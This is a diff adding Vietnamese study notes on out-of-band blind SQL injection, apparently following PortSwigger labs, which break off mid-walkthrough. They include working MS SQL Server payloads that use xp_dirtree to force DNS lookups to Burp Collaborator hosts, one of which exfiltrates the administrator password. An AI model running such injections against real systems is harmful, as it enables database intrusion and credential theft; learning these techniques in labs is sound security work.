@@ -309,3 +309,34 @@ Làm một cấu truy vấn tương tự với password :)) và ta thu được 
 - Sau khi test lòi lìn thì ta sẽ bắt đầu kiểm tra độ dài pass (chắc vẫn là 20 thôi) ![image](https://github.com/Myozz/Web_Applications/assets/94811005/bcd7f087-223c-455e-90f5-b20f5db3a3f2)
 ![image](https://github.com/Myozz/Web_Applications/assets/94811005/707a69ec-9eb3-4987-8f48-bf46bdecff61)
 - Giờ thì đến giải đoạn mò pass
+
+# Khai thác Blind SQLi sử dụng kĩ thuật out-of-band (OAST) 
+- Một app có thể tiến hành truy vấn giống nhau như ví dụ trước nhưng chúng lại không đồng bộ. App tiếp tục tiến trình được request trong luồng gốc, và sử dụng luồng để thực thi một truy vấn SQL sử dụng tracking cookie (hiểu chung là truy vấn sql với chạy tiến trình bị tách biệt với nhau). Truy vấn vẫn có lỗ hổng SQLi, nhưng không kĩ thuật nào trước có thể sử dụng
+- Trong trường hợp này, ta có thể khai thác Blind SQLi bằng cách kích hoạt tương tác mạng out-of-band tới hệ thống bạn điều khiển. Nó có thể được kích hoạt trên một điều kiện được thêm vào để chôm từng thông tin một. Hữu dụng hơn, dữ liệu có thể được lọc ra trong quá trình tương tác mạng
+- Một loạt các giao thức mạng đa dạng có thể sử dụng cho mục đích này, nhưng thường thì DNS sẽ hiểu quả nhất. Nhiều sản phẩm mạng cho phép truy vấn DNS tự do, bởi chúng cần thiết cho hoạt động thông thường của hệ thống phân phối
+- Công cụ dễ nhất và ngon nhất để thực hiện kĩ thuật out-of-band là Burp Collaborator. Đây là một server cung cấp các triển khai dịch vụ mạng khác nhau. Cho phép bạn nhận biết được khi nào tương tác mạng xảy ra như là một kết quả của việc gửi payload đơn lẻ tới vuln app. Burp Suite Pro có một built-in client được config để làm việc với Burp Collaborator ngay lập tức. Thông tin thêmowr [đây](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
+- Kĩ thuật kích hoạt truy vấn DNS dành riếng cho kiểu dtb này. Ví dụ, input dưới đây trên Ms SQL Serverr có thể được sử dụng để thực hiện một DNS lookup trên một domain xác định
+
+      '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+- Nó có thể khiến dtb thực hiện một lookup cho domain ```0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net```
+- Bạn có thể sử dụng Burp Collab để chôm vài cái subdomain ngon nghẻ và thăm dò Collab server để xác định khi có bất kì DNS lookup nào xảy ra
+## Lab liếm láp
+- Lab này vẫn là chứa Blind SQLi
+- Truy vấn SQL được thực thi không đồng bộ và useless trên response. Nên ta sẽ phải dùng đến kĩ thuật out-of-band
+- Mục tiêu của lab này thì thực hiện DNS lookup :||
+- Check các payload này ![image](https://github.com/Myozz/Web_Applications/assets/94811005/5bf49424-e171-4e75-95ca-60ce3b168c7c)
+- Inject payload vào sau trackingID
+- CHọn cái ```BURP-COLLABORATOR-SUBDOMAIN/``` (để nguyên cái http ở trước, rồi chuột phải - ```INsert collaborator payload```
+- Quay sang tab Collaborator, ta sẽ thu được kết quả (thường thì nó tự ra, không thì bấm pool)
+
+# Out-of-band (Tiếp)
+- Vừa rồi chúng ta đã xác định được cách thức hoạt động của OAST, bạn còn có thể sử dụng OAST channel để lọc dữ liệu từ vuln app. Ví dụ
+
+      '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+- Input này độc pass của ``admin``` user, thêm nột Collaborator subdomain đặc biệt vào, và kích hoạt dns lookup. Lookup này cho phép bạn xem password được ghi lại
+
+      S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+## Liêm lab
+- Lab này vẫn giống lab trước, khác ở chỗ ta cần dùng OAST để tìm ra pass của ```admin```
+- Vẫn là tận dụng cheatsheet ![image](https://github.com/Myozz/Web_Applications/assets/94811005/c1d62fa8-9e16-4533-8ac9-ba74bd3f56e1)
+- 
